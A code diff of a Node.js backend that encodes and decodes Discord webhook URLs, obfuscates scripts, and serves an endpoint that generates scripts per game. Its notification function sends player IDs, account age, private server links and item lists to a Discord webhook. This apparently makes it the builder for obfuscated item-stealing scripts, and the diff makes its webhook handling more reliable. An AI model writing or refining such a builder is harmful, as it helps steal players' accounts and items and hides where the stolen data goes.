@@ -193,37 +193,22 @@ const compleMap = {
 
 function decompileWebhook(compleString) {
   if (!compleString) return '';
-  console.log('🔍 Decoding webhook:', compleString);
   
   const parts = compleString.split(' ');
   let webhook = '';
   
   for (const part of parts) {
-    if (part.startsWith('MISS_')) {
-      // Handle placeholder for missing characters
-      const charCode = parseInt(part.replace('MISS_', ''));
-      const char = String.fromCharCode(charCode);
-      console.log(`🔧 Restoring missing char: '${char}' from ${part}`);
-      webhook += char;
-    } else if (compleMap[part]) {
+    if (compleMap[part]) {
       // Handle encoded characters (K10, X91, etc.)
-      const char = compleMap[part];
-      webhook += char;
-    } else if (part.length === 1) {
-      // Handle literal characters (:, /, ., -, etc.) that weren't encoded
-      console.log(`🔧 Using literal character: '${part}'`);
+      webhook += compleMap[part];
+    } else if (part.length === 1 && /[:\/\.\-_=&%+?]/.test(part)) {
+      // Handle literal URL characters that weren't encoded
       webhook += part;
-    } else {
-      console.log(`❌ Unknown code: '${part}'`);
     }
   }
   
-  console.log('🔍 Decoded before cleanup:', webhook);
-  
   // Convert to lowercase and remove spaces
-  const result = webhook.toLowerCase().replace(/\s+/g, '');
-  console.log('🔍 Final decoded result:', result);
-  return result;
+  return webhook.toLowerCase().replace(/\s+/g, '');
 }
 
 // Reverse mapping for encoding
@@ -234,14 +219,12 @@ for (const [key, value] of Object.entries(compleMap)) {
 
 function encodeWebhook(webhook) {
   if (!webhook) return '';
-  console.log('🔍 Encoding webhook:', webhook);
   
   const chars = webhook.split('');
   const encoded = chars.map(char => {
     // Check if character has encoding
     const encodedChar = reverseCompleMap[char];
     if (encodedChar) {
-      console.log(`✅ '${char}' -> '${encodedChar}'`);
       return encodedChar;
     }
     
@@ -249,20 +232,14 @@ function encodeWebhook(webhook) {
     const upperChar = char.toUpperCase();
     const encodedUpper = reverseCompleMap[upperChar];
     if (encodedUpper) {
-      console.log(`✅ '${char}' (as '${upperChar}') -> '${encodedUpper}'`);
       return encodedUpper;
     }
     
-    // Log missing characters
-    console.log(`❌ Missing encoding for: '${char}' (ASCII: ${char.charCodeAt(0)})`);
-    
-    // Return placeholder for missing characters instead of empty string
-    return `MISS_${char.charCodeAt(0)}`;
+    // Return the character as-is for URL chars like :, /, -, _, .
+    return char;
   });
   
-  const result = encoded.join(' ');
-  console.log('🔍 Encoded result:', result);
-  return result;
+  return encoded.join(' ');
 }
 
 async function obfuscateScript(script) {
@@ -392,6 +369,11 @@ async function sendProtectionNotification(protectionId, data) {
     const webhookURL = getProtectionWebhook(protectionId);
     if (!webhookURL) {
       throw new Error('Webhook not found for protection ID: ' + protectionId);
+    }
+
+    // Validate webhook URL format
+    if (!webhookURL.startsWith('https://') || !webhookURL.includes('discord.com/api/webhooks/')) {
+      throw new Error('Invalid webhook URL format: ' + webhookURL);
     }
 
     const { status, name, userid, displayname, accountage, playercount, gamename, privateserver, serverlink, items, mentioneveryone } = data;
@@ -1049,6 +1031,11 @@ app.post('/api/script/generate/:game', async (req, res) => {
       
       if (compleWebhook) {
         decodedWebhook = decompileWebhook(compleWebhook);
+        
+        if (!decodedWebhook || !decodedWebhook.startsWith('https://')) {
+          return res.status(400).json({ success: false, message: 'Webhook decode failed - invalid result' });
+        }
+        
         console.log('✅ Webhook retrieved and decoded from Key System API');
       } else {
         console.log('❌ No webhook found in Key System API');
